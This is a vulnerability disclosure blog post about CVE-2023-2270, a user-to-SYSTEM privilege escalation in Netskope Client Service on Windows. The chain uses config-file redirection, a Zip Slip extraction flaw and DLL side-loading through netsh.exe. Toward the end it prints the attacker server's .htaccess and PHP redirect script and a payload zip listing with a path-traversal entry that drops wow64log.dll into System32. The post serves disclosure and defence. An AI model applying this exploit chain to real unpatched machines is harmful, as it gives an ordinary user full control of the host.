---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-22_netskope-client-service-local-privilege-escalation.md
original_filename: 2023-06-22_netskope-client-service-local-privilege-escalation.md
title: Netskope Client Service Local Privilege Escalation
category: documents
detected_topics:
- access-control
- command-injection
- file-upload
- otp
- api-security
- cloud-security
tags:
- imported
- documents
- access-control
- command-injection
- file-upload
- otp
- api-security
- cloud-security
language: en
raw_sha256: b2ccd45afc5706ca22e8b41d33ce2286ee34959d34d143d4815e129fa4c1b97a
text_sha256: cb631b617e518c2839c246df2022ac8e81c81affbebd799955599b6b95b15154
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: false
---

# Netskope Client Service Local Privilege Escalation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-22_netskope-client-service-local-privilege-escalation.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, file-upload, otp, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: False
- Raw SHA256: `b2ccd45afc5706ca22e8b41d33ce2286ee34959d34d143d4815e129fa4c1b97a`
- Text SHA256: `cb631b617e518c2839c246df2022ac8e81c81affbebd799955599b6b95b15154`


## Content

---
title: "Netskope Client Service Local Privilege Escalation"
page_title: "Netskope Client Service Local Privilege Escalation | HDW Sec"
url: "https://hdwsec.fr/blog/20230622-netskope/"
final_url: "https://hdwsec.fr:443/fr/blog/20230622-netskope/"
authors: ["Jean-Jamil Khalife"]
programs: ["Netskope"]
bugs: ["Local Privilege Escalation", "DLL Hijacking", "Zip Slip attack"]
publication_date: "2023-06-22"
added_date: "2023-06-27"
source: "pentester.land/writeups.json"
original_index: 1019
---

> **CVE-2023-2270** · Local Privilege Escalation · Windows
> 
> **Product:** Netskope Client Service ≤ 99  
>  **Type:** Local Privilege Escalation  
>  **Impact:** USER to SYSTEM escalation
> 
> **2022-07-22:** Netskope contacted  
>  **2023-04-27:** Fix integrated

## __Introduction

![Netskope Logo](/blog/20230622-netskope/netskope-logo.png)

One of our clients recently called on us to check whether it was possible to compromise the company laptops they send to their employees. It’s a matter of checking with and without identifier if vulnerabilities exist.

This article describes a vulnerability found after unlocking the user session. A future article will explain how we bypassed bitlocker to compromise the machine without prior login.

The laptop was fully patched so I decided to see if third party applications were installed and possibly vulnerable. Several security software were present, including the famous Netskope which seemed interesting to me to check. I finally found several vulnerabilities which, when chained, lead to a USER to SYSTEM elevation of privilege.

As a reminder, Netskope is a cloud security platform that provides a complete security solution for companies that use cloud applications, access cloud data and use the Internet for their daily activities. Netskope enables organizations to discover, protect and control all activity in the cloud, as well as prevent threats and comply with regulations. The Netskope platform uses a data-centric security approach, which means it protects sensitive data wherever it resides, whether in cloud applications, SaaS services, IaaS/PaaS environments or on mobile devices.

In summary, Netskope helps companies securely adopt a cloud-first approach to their business, while ensuring their data is protected and regulatory compliant.

* * *

## __Analysis and exploitation of the vulnerabilities

Summary of vulnerabilities:

  * Netskope writes a json file accessible in read/write by the user. This json file contains connection information to netskope URLs ;
  * A ZIP file is downloaded and extracted by the netskope service (StAgentSVC) which runs with SYSTEM privileges. The extraction is vulnerable to the zip slip flaw, allowing to extract any, part, or all of the archive content ;
  * It is possible to launch and inject a DLL in the Netskope client (stAgentUI), in order to communicate with the service (StAgentSVC) ;
  * Netsh.exe can be launched by netskope with SYSTEM privileges and is vulnerable to a DLL side loading flaw.

By combining each of these vulnerabilities, it becomes possible to execute code on the host with SYSTEM privileges.

* * *

## __Entry point to communicate with the service

Two programs are launched:

  * a stAgentSVC service which runs with SYSTEM privileges ;
  * a stAgentUI.exe client that runs with user privileges and communicates with the service.

A user can interact with the Netskope Client service through a local network socket.

The stAgentSvc service listens on `127.0.0.1:57130` allowing a local user to connect to it. Each packet consists of a 4-byte header encoding the size of the data, followed by the data.

One must first send an initialization packet, containing in particular the client name and the **Netsk0pe** signature.

![Handshake packet showing NetSkope signature](/blog/20230622-netskope/handshake.png)

Once done, the agent returns a packet containing **Netsk0pe** and accepts incoming commands.

![Response packet](/blog/20230622-netskope/response.png)

The service receives commands (100, 101, etc.) in json format with optional arguments and executes them.

* * *

## __Communication protection with the service

In order to prevent any client from communicating with the server, the service checks if the client is located here: `C:\Program Files (x86)\Netskope\STAgent\stAgentUI.exe`

![Protection check](/blog/20230622-netskope/protection.png)

It will compare the absolute path of the two binaries:

![Path comparison](/blog/20230622-netskope/protection2.png)

Then send a RST, ACK packet if it’s not the good one.

![RST ACK packet](/blog/20230622-netskope/protection3.png)

The solution that I have chosen is to inject a DLL into it, then triggering the command. `stAgentUI.exe` can be controlled by a user without elevated privileges.

* * *

## __Overwriting the configuration file

Command 109 will be interesting for us. By sending the command `{"109":""}`, stAgentSvc will attempt to retrieve and then execute `certutil.exe`.

![Send command](/blog/20230622-netskope/sendcmd.png)

For this, it will connect to **_`https://xxx.goskope.com/config/getcertutil?orgkey=[TOKEN]&version=&os=win`_**

The server will respond with json data like this: **_`{"version": "THE_VERSION", "downloadurl" : "URL_TO_ZIP_FILE"}`_**

![JSON response example](/blog/20230622-netskope/example.png)

JSON data will be stored in **_`C:\ProgramData\netskope\stagent\download\certutil.json`_** but this file requires admin privileges to write into it. Fortunately we can work around that limitation thanks to the `nsbranding.json` file.

![Certutil JSON file](/blog/20230622-netskope/certutil.png)

Then the server will download the zip file available at the address given by the value of `downloadurl` and write it to **_`C:\ProgramData\netskope\stagent\download\certutil.zip`_**.

Once finished, it will create the **_`C:\ProgramData\netskope\stagent\certutil`_** directory and then extract the zipped data into it.

![Certutil folder with multiple DLLs](/blog/20230622-netskope/certutilfolder.png)

Finally, it will run the `certutil.exe` file with user privileges.

Nevertheless, there are vulnerabilities that allow the user to download an arbitrary zip file from anywhere and extract it wherever we want into the disk.

It is possible to modify the DNS server by rewriting the `nsbranding.json` file which contains a number of urls loaded by netskope when starting the service. This file can be rewritten with user privileges.

By modifying the value of the `AddonManagerHost` field, we let the server request our fake url.

![JSON configuration modification](/blog/20230622-netskope/json.png)

Read file:

![Read JSON](/blog/20230622-netskope/readjson.png)

Process field names:

![Process JSON fields](/blog/20230622-netskope/readjson2.png)

Note that once the json has been modified, the service must be restarted to reload it. However, a trick here is to have the service run certain commands multiple times. We then note that the loading is done again without needing to restart the StAgentSVC service.

* * *

## __Zip Slip Vulnerability

The extraction procedure is vulnerable to a Zip Slip flaw. Indeed, by creating a zip file that contains a relative file name, it is possible to extract files to the desired locations with SYSTEM privileges.

![Zip Slip](/blog/20230622-netskope/zipslip.png)

An application would be, for example, able to write or to rewrite a DLL file in a specific location, later loaded by an executable launched by the system. This leads to getting `NT\SYSTEM` privileges.

* * *

## __Code Execution via DLL Side Loading

Since it is possible to drop a DLL anywhere, how then can it be loaded by a system process?

After searching for a while, I discovered that stAgentSVC was running the `netsh.exe` process with SYSTEM privileges when given command 115.

By launching `procmon.exe`, we see that **_`c:\Windows\System32\wow64log.dll`_** is missing:

![Procmon](/blog/20230622-netskope/procmon.png)

It will create a 32-bit process as system which will try to load a DLL located at **_`c:\windows\system32\wow64log.DLL`_**.

So we just need to drop our DLL there and the service itself will load it for us through netsh!

* * *

## __Building the exploit

In the end, no need to restart the service. The exploit only takes a few seconds to trigger.

To sum up, the exploit performs the following actions:

  * Modify `nsbranding.json` file ;
  * Force the agent to reload this JSON file ;
  * Make the agent download and extract our specially crafted ZIP file to drop our DLL ;
  * Make the agent launch `netsh.exe`, resulting in loading our DLL that spawns a shell.

The exploit delivered to Netskope contains:

  * The file to inject DLL into `nsAgentUI.exe` ;
  * The DLL which allow to communicate with `stAgentSVC` ;
  * The server were configured like above.

**Here is the`.htaccess` configuration:**
  
  
  root@netskope:~# cat /var/www/html/.htaccess
  <IfModule mod_rewrite.c>
  
  Options +FollowSymLinks
  RewriteEngine On
  RewriteRule ^config/getcertutil$ config/getcertutil.php
  
  </IfModule>

**Here is the`getcertutil` code:**
  
  
  root@netskope:~# cat /var/www/html/config/getcertutil.php
  <?php
  function generateRandomString($length = 10) {
  $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
  $charactersLength = strlen($characters);
  $randomString = '';
  for ($i = 0; $i < $length; $i++) {
  $randomString .= $characters[rand(0, $charactersLength - 1)];
  }
  return $randomString;
  }
  
  if ($_GET['version'] === "")
  echo '{"version":"'.generateRandomString(rand(1,100)).'", "downloadurl":"https://[MY_SERVER].com/config/payload.zip"}';
  ?>

**Here is the ZIP file containing the DLL that loads the shell:**

_NOTE: The DLL file will be written to`C:\Windows\System32\`._
  
  
  root@netskope:~# unzip -l /var/www/html/config/payload.zip
  Archive:  /var/www/html/config/payload.zip
  Length  Date  Time  Name
  ---------  ---------- -----  ----
  112640  2022-07-26 13:55  ../../../../Windows/Sysnative/wow64log.dll
  ---------  -------
  112640  1 file

* * *

## __Conclusion

You should therefore not place systematic trust in security software, which may also come with its own vulnerabilities.

This vulnerability research is part of a security audit requested by one of our customers who wanted to know if it was possible to compromise the company laptops.

The vulnerability found made it possible to elevate our privileges from user to SYSTEM on the laptop we audited.

* * *

## __References

  * <https://www.netskope.com>
  * [Netskope Security Advisories](https://www.netskope.com/company/security-compliance-and-assurance/security-advisories-and-disclosures)
  * [NSKPSA-2023-001](https://www.netskope.com/company/security-compliance-and-assurance/security-advisories-and-disclosures/netskope-security-advisory-nskpsa-2023-001)
  * [CVE-2023-2270, NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-2270)

JK 

Écrit par Jean-Jamil Khalife Ingénieur cybersécurité, HDW Sec
